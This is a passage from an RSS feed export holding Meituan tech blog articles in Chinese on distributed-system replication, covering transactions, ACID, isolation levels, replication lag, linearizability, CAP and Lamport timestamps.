Liveness</h4><p>这两个词在分布式算法设计时起着十分关键的作用，其中安全性（Safety）表示没有意外发生，假设违反了安全性原则，我们一定能够指出它发生的时间点，并且安全性一旦违反，无法撤销。而活性（Liveness）则表示“预期的事情最终一定会发生”，可能我们无法明确具体的时间点，但我们期望它在未来某个时间能够满足要求。</p><p>在进行分布式算法设计时，通常需要必须满足安全性，而活性的满足需要具备一定的前提。</p><h2>7. 总结</h2><p>以上就是第一篇文章的内容，简单做下回顾，本文首先介绍了复制的三种常见模型，分别是主从复制、多主复制和无主复制，然后分别介绍了这三种模型的特点、适用场景以及优缺点。接下来，我们用了一个现实生活中的例子，向大家展示了分布式系统中常见的两个特有问题，分别是节点的部分失效以及无法共享系统时钟的问题，这两个问题为我们设计分布式系统带来了比较大的挑战。如果没有一些设计特定的措施，我们所设计的分布式系统将无法很好地满足设计的初衷，用户也无法通过分布式系统来完成自己想要的工作。</p><p>以上这些问题，我们会下篇文章《Replication（下）：事务，一致性与共识》中逐一进行解决，而事务、一致性、共识这三个关键词，会为我们在设计分布式系统时保驾护航。</p><h2>8. 作者简介</h2><p>仕禄，美团基础研发平台/数据科学与平台部工程师。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "https://tech.meituan.com/2022/08/25/replication-in-meituan-02.html",
    "timestampUsec": "1661501646081542",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Replication（下）：事务，一致性与共识",
    "author": ";美团技术团队",
    "published": 1661385600,
    "updated": 1661385600,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/08/25/replication-in-meituan-02.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>1. 前文回顾</h2><p>在上一篇中，我们主要介绍了分布式系统中常见的复制模型，并描述了每一种模型的优缺点以及使用场景，同时阐述了分布式系统中特有的一些技术挑战。首先，常见的分布式系统复制模型有3种，分别是主从复制模型、多主复制模型以及无主复制模型。此外，复制从客户端的时效性来说分为同步复制&amp;&amp;异步复制，异步复制具有滞后性，可能会造成数据不一致，因为这个不一致，会带来各种各样的问题。</p><p>此外，第一篇文章用了“老板安排人干活”的例子比喻了分布式系统中特有的挑战，即部分失效以及不可靠的时钟问题。这给分布式系统设计带来了很大的困扰。似乎在没有机制做保证的情况下，一个朴素的分布式系统什么事情都做不了。</p><p>在上一篇的最后，我们对分布式系统系统模型做了一些假设，这些假设对给出后面的解决方案其实是非常重要的。首先针对部分失效，是我们需要对系统的超时进行假设，一般我们假设为半同步模型，也就是说一般情况下延迟都非常正常，一旦发生故障，延迟会变得偏差非常大。另外，对于节点失效，我们通常在设计系统时假设为崩溃-恢复模型。最后，面对分布式系统的两个保证Safty和Liveness，我们优先保证系统是Safety，也就是安全；而Liveness（活性）通常在某些前提下才可以满足。</p><h2>2. 本文简介</h2><p>通过第一篇文章，我们知道了留待我们解决的问题有哪些。那么这篇文章中，将分别根据我们的假设去解决上述的挑战。这些保证措施包括事务、一致性以及共识。接下来讲介绍它们的作用以及内在联系，然后我们再回过头来审视一下Kafka复制部分的设计，看看一个实际的系统在设计上是否真的可以直接使用那些套路，最后介绍业界验证分布式算法的一些工具和框架。接下来，继续我们的数据复制之旅吧！</p><h2>3. 事务&amp;外部一致性</h2><p>说到事务，相信大家都能简单说出个一二来，首先能本能做出反应出的，应该就是所谓的“ACID”特性了，还有各种各样的隔离级别。是的，它们确实都是事务需要解决的问题。</p><p>在这一章中，我们会更加有条理地理解下它们之间的内在联系，详细看一看事务究竟要解决什么问题。在《DDIA》一书中有非常多关于数据库事务的具体实现细节，但本文中会弱化它们，毕竟本文不想详细介绍如何设计一款数据库，我们只需探究问题的本身，等真正寻找解决方案时再去详细看设计，效果可能会更好。下面我们正式开始介绍事务。</p><h3>3.1 事务的产生</h3><p>系统中可能会面临下面的问题：</p><ol><li>程序依托的操作系统层，硬件层可能随时都会发生故障（包括一个操作执行到一半时）。</li><li>应用程序可能会随时发生故障（包括操作执行到一半时）。</li><li>网络中断可能随时会发生，它会切断客户端与服务端的链接或数据库之间的链接。</li><li>多个客户端可能会同时访问服务端，并且更新统一批数据，导致数据互相覆盖（临界区）。</li><li>客户端可能会读到过期的数据，因为上面说的，可能操作执行一半应用程序就挂了。</li></ol><p>假设上述问题都会出现在我们对于存储系统（或者数据库）的访问中，这样我们在开发自己应用程序的同时，还需要额外付出很大代价处理这些问题。事务的核心使命就是尝试帮我们解决这些问题，提供了从它自己层面所看到的安全性保证，让我们在访问存储系统时只专注我们本身的写入和查询逻辑，而非这些额外复杂的异常处理。而说起解决方式，正是通过它那大名鼎鼎的ACID特性来进行保证的。</p><h3>3.2 不厌其烦——ACID特性</h3><p>这四个缩写所组成的特性相信大家已形成本能反应，不过《DDIA》一书中给出的定义确实更加有利于我们更加清晰地理解它们间的关系，下面将分别进行说明：</p><p><strong>A：原子性(Atomicity)</strong>：原子性实际描述的是同一个客户端对于多个操作之间的限制，这里的原子表示的是不可分割，原子性的效果是，假设有操作集合{A,B,C,D,E}，执行后的结果应该和单个客户端执行一个操作的效果相同。从这个限制我们可以知道：</p><ol><li>对于操作本身，就算发生任何故障，我们也不能看到任何这个操作集中间的结果，比如操作执行到C时发生了故障，但是事务应该重试，直到我们需要等到执行完之后，要么我们应该恢复到执行A之前的结果。</li><li>对于操作作用的服务端而言，出现任何故障，我们的操作不应该对服务端产生任何的副作用，只有这样客户端才能安全的重试，否则，如果每次重试都会对服务端产生副作用，客户端是不敢一直安全的重试的。</li></ol><p>因此，对于原子性而言，书中描述说的是能在执行发生异常时丢弃，可以直接终止，且不会对服务端产生任何副作用，可以安全的重试，原子性也成为“可终止性”。</p><p><strong>C：一致性（Consistency）</strong>：这个名词有太多的重载，也就是说它在不同语境中含义会截然不同，但可能又有联系，这就可能让我们陷入混乱，比如：</p><ol><li>数据复制时，副本间具有一致性，这个一致性应该指上一章中提到的不同副本状态的一致。</li><li>一致性Hash，这是一种分区算法，个人理解是为了能够在各种情况下这个Hash算法都可以以一致的方式发挥作用。</li><li>CAP定理中的一致性指的是后面要介绍的一个特殊的内部一致性，称为“线性一致性”。</li><li>我们稍后要介绍ACID中的一致性，指的是程序的某些“不变式”，或“良好状态”。</li></ol><p>我们需要区分不同语境中一致性所表达含义的区别，也希望大家看完今天的分享，能更好地帮助大家记住这些区别。话说回来，这里的一致性指的是对于数据一组特定陈述必须成立，即“不变式”，这里有点类似于算法中的“循环不变式”，即当外界环境发生变化时，这个不变式一定需要成立。</p><p>书中强调，这个里面的一致性更多需要用户的应用程序来保证，因为只有用户知道所谓的不变式是什么。这里举一个简单的小例子，例如我们往Kafka中append消息，其中有两条消息内容都是2，如果没有额外的信息时，我们也不知道到底是客户端因为故障重试发了两次，还是真的就有两条一模一样的数据。</p><p>如果想进行区分，可以在用户程序消费后走自定义的去重逻辑，也可以从Kafka自身出发，客户端发送时增加一个“发号”环节标明消息的唯一性（高版本中Kafka事务的实现大致思路）这样引擎本身就具备了一定的自己设置“不变式”的能力。不过如果是更复杂的情况，还是需要用户程序和调用服务本身共同维护。</p><p><strong>I：隔离性（Isolation）</strong>：隔离性实际上是事务的重头戏，也是门道最多的一环，因为隔离性解决的问题是多个事务作用于同一个或者同一批数据时的并发问题。一提到并发问题，我们就知道这一定不是个简单的问题，因为并发的本质是时序的不确定性，当这些不确定时序的作用域有一定冲突（Race）时就可能会引发各种各样的问题，这一点和多线程编程是类似的，但这里面的操作远比一条计算机指令时间长得多，所以问题会更严重而且更多样。</p><p>这里给一个具体的实例来直观感受下，如下图展示了两个客户端并发的修改DB中的一个counter，由于User2的get counter发生的时刻在User1更新的过程中，因此读到的counter是个旧值，同样User2更新也类似，所以最后应该预期counter值为44，结果两个人看到的counter都是43（类似两个线程同时做value++）。</p><p>一个完美的事务隔离，在每个事务看来，整个系统只有自己在工作，对于整个系统而言这些并发的事务一个接一个的执行，也仿佛只有一个事务，这样的隔离成为“可序列化（Serializability）”。当然，这样的隔离级别会带来巨大的开销，因此出现了各种各样的隔离级别，进而满足不同场景的需要。后文会详细介绍不同的隔离级别所解决的问题。</p><p><img src=\"https://p0.meituan.net/travelcube/881b505ab9ab8517d540c83fec1d6553114657.png\" alt=\"图1 隔离性问题导致更新丢失\" referrerpolicy=\"no-referrer\"></p><p><strong>D：持久性（Durability）</strong>：这个特性看似比较好理解，就一点，只要事务完成，不管发生任何问题，都不应该发生数据丢失。从理论上讲，如果是单机数据库，起码数据已被写入非易失性存储（至少已落WAL），分布式系统中数据被复制到了各个副本上，并受到副本Ack。但实际情况下，也未必就一定能保证100%的持久性。这里面的情况书中有详细的介绍，这里就不做重复的Copy工作了，也就是说事务所保证的持久性一般都是某种权衡下的结果。</p><p>上面四个特性中，实际上对于隔离性的问题，可能是问题最多样的，也是最为复杂的。因为一味强调“序列化”可能会带来不可接受的性能开销。因此，下文将重点介绍一些比可序列化更弱的隔离级别。</p><h3>3.3 事务按操作对象的划分&amp;&amp;安全的提交重试</h3><p>在介绍后面内容前，有两件事需要事先做下强调，分别是事务操作的对象以及事务的提交与重试，分为单对象&amp;&amp;多对象。</p><p><strong>单对象写入</strong>：这种书中给出了两种案例。</p><ol><li><p>第一个是单个事物执行一个长时间的写入，例如写入一个20KB的JSON对象，假设写到10KB时断掉会发生什么？</p><p>a. 数据库是否会存在10KB没法解析的脏数据。\nb. 如果恢复之后数是否能接着继续写入。\nc. 另一个客户端读取这个文档，是否能够看到恢复后的最新值，还是读到一堆乱码。</p></li><li><p>另一种则是类似上图中Counter做自增的功能。</p></li></ol><p>这种事务的解决方法一般是通过日志回放（原子性）、锁（隔离性）、CAS（隔离性）等方式来进行保证。</p><p><strong>多对象事务</strong>：这类事务实际上是比较复杂的，比如可能在某些分布式系统中，操作的对象可能会跨线程、跨进程、跨分区，甚至跨系统。这就意味着，我们面临的问题多于上一篇文章提到的那些分布式系统特有的问题，处理那些问题显然要更复杂。有些系统干脆把这种“锅”甩给用户，让应用程序自己来处理问题，也就是说，我们可能需要自己处理因没有原子性带来的中间结果问题，因为没有隔离性带来的并发问题。当然，也有些系统实现了这些所谓的分布式事务，后文中会介绍具体的实现手段。</p><p>另一个需要特别强调的点是重试，事务的一个核心特性就是当发生错误时，客户端可以安全的进行重试，并且不会对服务端有任何副作用，对于传统的真的实现ACID的数据库系统，就应该遵循这样的设计语义。但在实际实践时，如何保证上面说的能够“安全的重试”呢？书中给出了一些可能发生的问题和解决手段：</p><ol><li>假设事务提交成功了，但服务端Ack的时候发生了网络故障，此时如果客户端发起重试，如果没有额外的手段，就会发生数据重复，这就需要服务端或应用程序自己提供能够区分消息唯一性的额外属性（服务端内置的事务ID或者业务自身的属性字段）。</li><li>由于负载太大导致了事务提交失败，这是贸然重试会加重系统的负担，这时可在客户端进行一些限制，例如采用指数退避的方式，或限制一些重试次数，放入客户端自己系统所属的队列等。</li><li>在重试前进行判断，尽在发生临时性错误时重试，如果应用已经违反了某些定义好的约束，那这样的重试就毫无意义。</li><li>如果事务是多对象操作，并且可能在系统中发生副作用，那就需要类似“两阶段提交”这样的机制来实现事务提交。</li></ol><h3>3.4 弱隔离级别</h3><p>事务隔离要解决的是并发问题，并发问题需要讨论两个问题时序与竞争，往往由于事物之间的操作对象有竞争关系，并且又因为并发事务之间不确定的时序关系，会导致这些所操作的有竞争关系的对象会出现各种奇怪的结果。</p><p>所谓不同的隔离级别，就是试图去用不同的开销来满足不同场景下对于时序要求的严格程度。我们可能不一定知道具体怎么实现这些事务隔离级别，但每个隔离级别解决的问题本身我们应该非常清晰，这样才不会在各种隔离级别和开销中比较轻松的做权衡。这里，我们不直接像书中一样列举隔离级别，我们首先阐述并发事务可能产生的问题，然后再去介绍每种隔离级别分别能够解决那些问题。</p><h4>脏读</h4><p>所谓脏读，指的就是用户能不能看到一个还没有提交事务的结果，如果是，就是脏读。下图展示了没有脏读应该满足什么样的承诺，User1的一个事务分别设置x=3、y=3，但在这个事务提交之前，User2在调用get x时，需要返回2，因为此时User1并没有提交事务。</p><p><img src=\"https://p0.meituan.net/travelcube/94a0be7abd5dda2db5ab8f5a10ff5d2a120252.png\" alt=\"图2 脏读\" referrerpolicy=\"no-referrer\"></p><p>防止脏读的意义：</p><ol><li>如果是单对象事务，客户端会看到一个一会即将可能被回滚的值，如果我需要依据这个值做决策，就很有可能会出现决策错误。</li><li>如果是多对象事务，可能客户端对于不同系统做访问时一部分数据更新，一部分未更新，那样用户可能会不知所措。</li></ol><h4>脏写</h4><p>如果一个客户端覆盖了另一个客户端尚未提交的写入，我们就称这样的现象为脏写。</p><p>这里同样给个实例，对于一个二手车的交易，需要更新两次数据库实现，但有两个用户并发的进行交易，如果像图中一样不禁止脏写，就可能存在销售列表显示交易属于Bob但发票却发给了Alice，因为两个事务对于两个数据的相同记录互相覆盖。</p><p><img src=\"https://p0.meituan.net/travelcube/308833bda699253d5d63b0b42f25287c185997.png\" alt=\"图3 脏写\" referrerpolicy=\"no-referrer\"></p><h4>读偏差（不可重复读）</h4><p>直接上例子，Alice在两个银行账户总共有1000块，每个账户500，现在她想从一个账户向另一个账户转账100，并且她想一直盯着自己的两个账户看看钱是否转成功了。不巧的是，他第一次看账户的时候转账还没发生，而成功后只查了一个账户的值，正好少了100，所以最后加起来会觉得自己少了100元。</p><p>如果只是这种场景，其实只是个临时性的现象，后面再查询就会得到正确的值，但是如果基于这样的查询去做别的事情，那可能就会出现问题了，比如将这个记录Select出来进行备份，以防DB崩溃。但不巧如果后面真的崩溃，如果基于这次查询到的数据做备份，那这100元可能真的永久的丢失了。如果是这样的场景，不可重复读是不能被接受的。</p><p><img src=\"https://p1.meituan.net/travelcube/8df528c3b363c3950769e12a40ebe795175350.png\" alt=\"图4 读偏差\" referrerpolicy=\"no-referrer\"></p><h4>更新丢失</h4><p>这里直接把之前那个两个用户同时根据旧值更新计数器的例子搬过来，这是个典型的更新丢失问题：</p><p><img src=\"https://p0.meituan.net/travelcube/881b505ab9ab8517d540c83fec1d6553114657.png\" alt=\"图5 隔离性问题导致更新丢失\" referrerpolicy=\"no-referrer\"></p><h4>写偏差 &amp;&amp; 幻读</h4><p>这种问题描述的是，事务的写入需要依赖于之前判断的结果，而这个结果可能会被其他并发事务修改。</p><p><img src=\"https://p0.meituan.net/travelcube/6df164399f97d69d8fb12aaefab8a6b4254800.png\" alt=\"图6 幻读\" referrerpolicy=\"no-referrer\"></p><p>实例中有两个人Alice和Bob决定是否可以休班，做这个决定的前提是判断当前是否有两个以上的医生正在值班，如果是则自己可以安全的休班，然后修改值班医生信息。但由于使用了快照隔离（后面会介绍）机制，两个事务返回的结果全都是2，进入了修改阶段，但最终的结果其实是违背了两名医生值班的前提。</p><p>造成这个问题的根本原因是一种成为“幻读”的现象，也就是说两个并发的事务，其中一个事务更改了另一个事物的查询结果，这种查询一般都是查询一个聚合结果，例如上文中的count或者max、min等，这种问题会在下面场景中出现问题。</p><ul><li>抢订会议室</li><li>多人游戏更新位置</li><li>唯一用户名</li></ul><p>上面我们列举了事务并发可能产生的问题，下面我们介绍各种隔离级别所能解决的问题。</p><table><thead><tr><th align=\"center\">隔离级别&amp;&amp;简单实现手段/问题</th><th align=\"center\">脏读</th><th align=\"center\">脏写</th><th align=\"center\">读偏差</th><th align=\"center\">更新丢失</th><th align=\"center\">写偏差(幻读)</th></tr></thead><tbody><tr><td align=\"center\">读已提交(行锁 or 记住旧值)</td><td align=\"center\">Y</td><td align=\"center\">Y</td><td align=\"center\">N</td><td align=\"center\">N</td><td align=\"center\">N</td></tr><tr><td align=\"center\">可重复读(快照隔离，CAS)</td><td align=\"center\">Y</td><td align=\"center\">Y</td><td align=\"center\">Y</td><td align=\"center\">Maybe</td><td align=\"center\">N</td></tr><tr><td align=\"center\">可串行化(2PL悲观锁 or SSI乐观锁)</td><td align=\"center\">Y</td><td align=\"center\">Y</td><td align=\"center\">Y</td><td align=\"center\">Y</td><td align=\"center\">Y</td></tr></tbody></table><h3>3.5 本章小结</h3><p>事务用它的ACID特性，为用户屏蔽了一些错误的处理。首先，原子性为用户提供了一个可安全重试的环境，并且不会对相应的系统产生副作用。一致性能够在一定程度上让程序满足所谓的不变式，隔离性通过不同的隔离级别解决不同场景下由于事务并发导致的不同现象，不同的隔离性解决的问题不同，开销也不同，需要用户按需决策，最后持久性让用户安心的把数据写进我们设计的系统。</p><p>总体而言，事务保证的是不同操作之间的一致性，一个极度完美的事务实现，让用户看上去就只有一个事务在工作，每次只执行了一个原子操作。因此，我们称事务所解决的是操作的一致性。这一章中，我们更多谈论的还是单机范围的事务。接下来，我们会把问题阈扩大，实际上分布式系统也有这样的问题，并且分布式系统还有类似的复制滞后问题，导致就算看似是操作的是一个对象，也存在不同的副本，这会使得我们所面对的问题更加复杂。下一章，我们重点介绍另一种一致性问题以及解决。</p><h2>4. 内部一致性与共识</h2><h3>4.1 复制滞后性的问题</h3><p>这里我们首先回到上一篇中讲的复制的滞后性，滞后性所带来的的一个最直观的问题就是，如果在复制期间客户端发起读请求，可能不同的客户端读到的数据是不一样的。这里面书中给了三种不同类型的一致性问题。我们分别来看这些事例：</p><p><img src=\"https://p0.meituan.net/travelcube/67a8b5fd3bd181af0092758861b37b55188845.png\" alt=\"图7 复制滞后问题\" referrerpolicy=\"no-referrer\"></p><p>第一张图给出的是一个用户先更新，然后查看更新结果的事例，比如用户对某一条博客下做出了自己的评论，该服务中的DB采用纯的异步复制，数据写到主节点就返回评论成功，然后用户想刷新下页面看看自己的评论能引发多大的共鸣或跟帖，这是由于查询到了从节点上，所以发现刚才写的评论“不翼而飞”了，如果系统能够避免出现上面这种情况，我们称实现了“写后读一致性”（读写一致性）。</p><p>上面是用户更新后查看的例子，下一张图则展示了另一种情况。用户同样是在系统中写入了一条评论，该模块依旧采用了纯异步复制的方法实现，此时有另一位用户来看，首先刷新页面时看到了User1234的评论，但下一次刷新，则这条评论又消失了，好像时钟出现了回拨，如果系统能够保证不会让这种情况出现，说明系统实现了“单调读”一致性（比如腾讯体育的比分和详情页）。</p><p><img src=\"https://p0.meituan.net/travelcube/3ef1afa0257fc8b7dc79ca4890adde5e224805.png\" alt=\"图8 复制滞后问题\" referrerpolicy=\"no-referrer\"></p><p>除了这两种情况外，还有一种情况，如下图所示：</p><p><img src=\"https://p1.meituan.net/travelcube/70df208d211f1dd3436e2a94eda77d46240423.png\" alt=\"图9 复制滞后问题\" referrerpolicy=\"no-referrer\"></p><p>这个问题会比前面的例子看上去更荒唐，这里有两个写入客户端，其中Poons问了个问题，然后Cake做出了回答。从顺序上，MrsCake是看到Poons的问题之后才进行的回答，但是问题与回答恰好被划分到了数据库的两个分区（Partition）上，对于下面的Observer而言，Partition1的Leader延迟要远大于Partition2的延迟，因此从Observer上看到的是现有答案后有的问题，这显然是一个违反自然规律的事情，如果能避免这种问题出现，那么可称为系统实现了“前缀读一致性”。</p><p>在上一篇中，我们介绍了一可以检测类似这种因果的方式，但综上，我们可以看到，由于复制的滞后性，带来的一个后果就是系统只是具备了最终一致性，由于这种最终一致性，会大大的影响用户的一些使用体验。上面三个例子虽然代表了不同的一致性，但都有一个共性，就是由于复制的滞后性带来的问题。所谓复制，那就是多个客户端甚至是一个客户端读写多个副本时所发生的的问题。这里我们将这类一致性问题称为“内部一致性（内存一致性）”，即表征由于多个副本读写的时序存在的数据不一致问题。</p><h3>4.2 内部一致性概述</h3><p>实际上，内部一致性并不是分布式系统特有的问题，在多核领域又称内存一致性，是为了约定多处理器之间协作。如果多处理器间能够满足特定的一致性，那么就能对多处理器所处理的数据，操作顺序做出一定的承诺，应用开发人员可以根据这些承诺对自己的系统做出假设。如下图所示：</p><p><img src=\"https://p0.meituan.net/travelcube/c0835eb488f8ca238f3961ec9a57e850127827.png\" alt=\"图10 CPU结构\" referrerpolicy=\"no-referrer\"></p><p>每个CPU逻辑核心都有自己的一套独立的寄存器和L1、L2Cache，这就导致如果我们在并发编程时，每个线程如果对某个主存地址中变量进行修改，可能都是优先修改自己的缓存，并且读取变量时同样是会先读缓存。这实际上和我们在分布式中多个客户端读写多个副本的现象是类似的，只不过分布式系统中是操作粒度，而处理器则是指令粒度。在多处理器的内存一致性中，有下面几种常见的模型。</p><p><img src=\"https://p0.meituan.net/travelcube/c0835eb488f8ca238f3961ec9a57e850127827.png\" alt=\"图11 内存一致性--百度百科\" referrerpolicy=\"no-referrer\"></p><p>可以看到，这些一致性约束的核心区分点就是在产生并发时对顺序的约束，而用更专业一点的词来说，线性一致性需要的是定义“全序”，而其他一致性则是某种“偏序”，也就是说允许一些并发操作间不比较顺序，按所有可能的排列组合执行。</p><h3>4.3 举一反三：分布式系统中的内部一致性</h3><p>如下图所示：</p><p><img src=\"https://p0.meituan.net/travelcube/25f64e5fb1496bdc7a48bc8c37f41c7760619.png\" alt=\"图12 内存一致性\" referrerpolicy=\"no-referrer\"></p><p>分布式中的内部一致性主要分为4大类：线性一致性–&gt;顺序一致性–&gt;因果一致性–&gt;处理器一致性，而从偏序与全序来划分，则划分为强一致性（线性一致性）与最终一致性。</p><p>但需要注意的是，只要不是强一致的内部一致性，但最终一致性没有任何的偏序保障。图中的这些一致性实际都是做了一些偏序的限制，比朴素的最终一致性有更强的保证，这里其他一致性性的具体实例详见《大数据日知录》第二章，那里面有比较明确对于这些一致性的讲解，本章我们重点关注强一致。</p><h3>4.4 我们口中的“强一致性”——线性一致性</h3><p>满足线性一致性的系统给我们这样一种感觉，这系统看着只有一个副本，这样我就可以放心地读取任何一个副本上的数据来继续我们的应用程序。这里还是用一个例子来具体说明线性一致性的约束，如下图所示：</p><p><img src=\"https://p0.meituan.net/travelcube/bd5f19ecff638a6bdf146406e920875c78948.png\" alt=\"图13 线性一致性\" referrerpolicy=\"no-referrer\"></p><p>这里有三个客户端同时操作主键x，这个主键在书中被称为寄存器（Register），对该寄存器存在如下几种操作：</p><ol><li>write(x，v) =&gt;r表示尝试更新x的值为v，返回更新结果r。</li><li>read(x) =&gt; v表示读取x的值，返回x的值为v。</li></ol><p>如图中所示，在C更新x的值时，A和B反复查询x的最新值，比较明确的结果是由于ClientA在ClientC更新x之前读取，所以第一次read(x)一定会为0，而ClientA的最后一次读取是在ClientC成功更新x的值后，因此一定会返回1。而剩下的读取，由于不确定与write(x,1)的顺序（并发），因此可能会返回0也可能返回1。对于线性一致性，我们做了下面的规定：</p><p><img src=\"https://p0.meituan.net/travelcube/a46f2b10e183c73e5937797c2914cf6187419.png\" alt=\"图14 线性一致性\" referrerpolicy=\"no-referrer\"></p><p>在一个线性一致性系统中，在写操作调用到返回之前，一定有一个时间点，客户端调用read能读到新值，在读到新值之后，后续的所有读操作都应该返回新值。（将上面图中的操作做了严格的顺序，及ClientA read-&gt;ClientB read-&gt;ClientC write-ClientA read-&gt;clientB read-&gt;clientAread）这里为了清晰，书中做了进一步细化。在下面的例子中，又增加了一种操作：</p><ul><li>cas(x, v_old, v_new)=&gt;r 及如果此时的值时v_old则更新x的值为v_new，返回更新结果。</li></ul><p>如图：每条数显代表具体事件发生的时点，线性一致性要求：如果连接上述的竖线，要求必须按照时间顺序向前推移，不能向后回拨（图中的read(x)=2就不满足线性化的要求，因为x=2在x=4的左侧）。</p><p><img src=\"https://p1.meituan.net/travelcube/aa46771ed3657f5265645e9d61bc0179164081.png\" alt=\"图15 线性一致性\" referrerpolicy=\"no-referrer\"></p><h3>4.5 什么时候需要依赖线性化？</h3><p>如果只是类似论坛中评论的先后顺序，或者是体育比赛页面刷新页面时的来回跳变，看上去并不会有什么致命的危害。但在某些场景中，如果系统不是线性的可能会造成更严重的后果。</p><ol><li><strong>加锁&amp;&amp;选主</strong>：在主从复制模型下，需要有一个明确的主节点去接收所有写请求，这种选主操作一般会采用加锁实现，如果我们依赖的锁服务不支持线性化的存储，那就可能出现跳变导致“脑裂”现象的发生，这种现象是绝对不能接受的。因此针对选主场景所依赖的分布式锁服务的存储模块一定需要满足线性一致性（一般而言，元数据的存储也需要线性化存储）。</li><li><strong>约束与唯一性保证</strong>：这种场景也是显而易见的，比如唯一ID、主键、名称等等，如果没有这种线性化存储承诺的严格的顺序，就很容易打破唯一性约束导致很多奇怪的现象和后果。</li><li><strong>跨通道（系统）的时间依赖</strong>：除了同一系统中，可能服务横跨不同系统，对于某个操作对于不同系统间的时序也需要有限制，书中举了这样一个例子。</li></ol><p><img src=\"https://p0.meituan.net/travelcube/68f499806be24ae757225a2d25a7706a104378.png\" alt=\"图16 跨通道线性一致性\" referrerpolicy=\"no-referrer\"></p><p>比如用户上传图片，类似后端存储服务可能会根据全尺寸图片生成低像素图片，以便增加用户服务体验，但由于MQ不适合发送图片这种大的字节流，因此全尺寸图片是直接发给后端存储服务的，而截取图片则是通过MQ在后台异步执行的，这就需要2中上传的文件存储服务是个可线性化的存储。如果不是，在生成低分辨率图像时可能会找不到，或读取到半张图片，这肯定不是我们希望看到的。</p><p>线性化不是避免竞争的唯一方法，与事务隔离级别一样，对并发顺序的要求，可能会根据场景不同有不同的严格程度。这也就诞生了不同级别的内部一致性级别，不同的级别也同样对应着不同的开销，需要用户自行决策。</p><h3>4.6 实现线性化系统</h3><p>说明了线性化系统的用处，下面我们来考虑如何实现这样的线性化系统。</p><p>根据上文对线性化的定义可知，这样系统对外看起来就像只有一个副本，那么最容易想到的方式就是，干脆就用一个副本。但这又不是分布式系统的初衷，很大一部分用多副本是为了做容错的，多副本的实现方式是复制，那么我们来看看，上一篇分享中那些常见的复制方式是否可以实现线性系统：</p><ol><li>主从复制（部分能实现）：如果使用同步复制，那样系统确实是线性化的，但有一些极端情况可能会违反线性化，比如由于成员变更过程中的“脑裂”问题导致消费异常，或者如果我们使用异步复制故障切换时会同时违反事务特性中的持久化和内部一致性中的线性化。</li><li>共识算法（线性化）：共识算法在后文会重点介绍，它与主从复制类似，但通过更严格的协商机制实现，可以在主从复制的基础上避免一些可能出现的“脑裂”等问题，可以比较安全的实现线性化存储。</li><li>多主复制（不能线性化）。</li><li>无主复制（可能不能线性化）：主要取决于具体Quorum的配置，对强一致的定义，下图给了一种虽然满足严格的Quorum，但依然无法满足线性化的例子。</li></ol><p><img src=\"https://p0.meituan.net/travelcube/a845e42796b769b51b242ea8a06f3e9a140623.png\" alt=\"图17 Quorum无法实现线性一致\" referrerpolicy=\"no-referrer\"></p><h4>实现线性化的代价——是时候登场了，CAP理论</h4><p>在上一次分享中，我们讲过，分布式系统中网络的不可靠性，而一旦网络断开（P），副本间一定会导致状态无法达到线性一致，这时候到底是继续提供服务但可能得到旧值（A），还是死等网络恢复保证状态的线性一致呢（C），这就是著名的CAP了。</p><p>但是其实CAP理论的定义面还是比较窄的，其中C只是线性一致性，P只代表网络分区（彻底断开，而不是延迟），这里面实际有相当多的折中，就可以完全满足我们系统的需求了，所以不要迷信这个理论，还是需要根据具体的实际情况去做分析。</p><h4>层层递进–实现线性化系统</h4><p>从对线性一致性的定义我们可以知道，顺序的检测是实现线性化系统的关键，这里我们跟着书中的思路一步步地来看：我们怎么能对这些并发的事务定义出它们的顺序。</p><h4>a.捕捉因果关系</h4><p>与上一次分享的内容类似，并发操作间有两种类型，可能有些操作间具有天然逻辑上的因果关系，还有些则没法确定，这里我们首先先尝试捕获那些有因果关系的操作，实现个因果一致性。这里的捕获我们实际需要存储数据库（系统）操作中的所有因果关系，我们可以使用类似版本向量的方式（忘记的同学，可以回看上一篇中两个人并发操作购物车的示例）。</p><h4>b.化被动为主动–主动定义</h4><p>上面被动地不加任何限制的捕捉因果，会带来巨大的运行开销（内存，磁盘），这种关系虽然可以持久化到磁盘，但分析时依然需要被载入内存，这就让我们有了另一个想法，我们是否能在操作上做个标记，直接定义这样的因果关系？</p><p>最最简单的方式就是构建一个全局发号器，产生一些序列号来定义操作间的因果关系，比如需要保证A在B之前发生，那就确保A的全序ID在B之前即可，其他的并发操作顺序不做硬限制，但操作间在处理器的相对顺序不变，这样我们不但实现了因果一致性，还对这个限制进行了增强。</p><h4>c.Lamport时间戳</h4><p>上面的设想虽然比较理想，但现实永远超乎我们的想象的复杂，上面的方式在主从复制模式下很容易实现，但如果是多主或者无主的复制模型，我们很难设计这种全局的序列号发号器，书中给出了一些可能的解决方案，目的是生成唯一的序列号，比如：</p><ol><li>每个节点各自产生序列号。</li><li>每个操作上带上时间戳。</li><li>预先分配每个分区负责产生的序列号。</li></ol><p>但实际上，上面的方法都可能破坏因果关系的偏序承诺，原因就是不同节点间负载不同、时钟不同、参照系不同。这里我们的并发大神Lamport登场了，他老人家自创了一个Lamport逻辑时间戳，完美地解决了上面的所有问题。如下图所示：</p><p><img src=\"https://p0.meituan.net/travelcube/755d3ad6551fe6d3422edf290d99f64a121164.png\" alt=\"图18 Lamport时间戳\" referrerpolicy=\"no-referrer\"></p><p>初识Lamport时间戳，还是研究生分布式系统课上，当时听得云里雾里，完全不知道在说啥。今天再次拿过来看，有了上下文，稍微懂了一点点。简单来说定义的就是使用逻辑变量定义了依赖关系，它给定了一个二元组<counter nodeid=\"\">，然后给定了一个比较方式：</counter>,&gt;</p><ol><li>先比较Counter，Counter大的后发生（会承诺严格的偏序关系）。</li><li>如果Counter相同，直接比较NodeId，大的定义为后发生（并发关系）。</li></ol><p>如果只有这两个比较，还不能解决上面的因果偏序被打破的问题，但是这个算法不同的是，它会把这个Node的Counter值内嵌到请求的响应体中，比如图中的A，在第二次向Node2发送更新max请求时，会返回当前的c=5，这样Client会把本地的Counter更新成5，下一次会增1这样使用Node上的Counter就维护了各个副本上变量的偏序关系，如果并发往两个Node里写就直接定义为并发行为，用NodeId定义顺序了。</p><h4>d. 